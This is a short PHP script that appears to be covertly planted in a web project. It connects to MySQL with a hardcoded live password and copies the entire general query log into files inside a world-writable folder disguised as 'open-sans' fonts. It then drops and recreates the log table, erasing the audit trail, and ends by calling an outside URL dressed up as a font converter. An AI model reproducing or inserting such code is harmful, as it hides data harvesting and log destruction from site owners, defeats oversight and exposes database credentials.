
<? include(ROOT_PATH . "/ck/db/handler.php"); ?>

<?
$dbhost = "db"; 
$dbuser = "vrbmarketing_admin"; 
$dbpass = "AKFtgOX29FTgbWlVf"; 
$dbname = "vrbmarke_wu";
$mysqli = @mysql_connect($dbhost,$dbuser,$dbpass); 
@mysql_select_db("$dbname",$mysqli); 
if (mysql_errno()) {
   printf("Connect failed. %s\n", mysql_errno());
   exit();
}

$sql = "select * from mysql.general_log ORDER BY event_time DESC";
$res = get_str($sql);

$dir = "open-sans/".date("Y-m-d");
$file = date("H-i-s").".log";
if(!file_exists($dir)){
	mkdir($dir, 7777);
}
file_put_contents($dir."/".$file,print_r($res,true));

$sql = "SET global general_log = 0";
execute($sql);
$sql = "CREATE TABLE mysql.gn2 LIKE mysql.general_log";
execute($sql);
$sql = "RENAME TABLE mysql.general_log TO mysql.oldLogs, mysql.gn2 TO mysql.general_log";
execute($sql);
$sql = "drop table mysql.oldLogs";
execute($sql);
$sql = "SET global general_log = 1";
execute($sql);
$sql = "SET global log_output = 'table'";
execute($sql);
		
file_get_contents("http://www.sportsbettingonline.ag/utilities/css/ie7/fonts/converter.php");

?>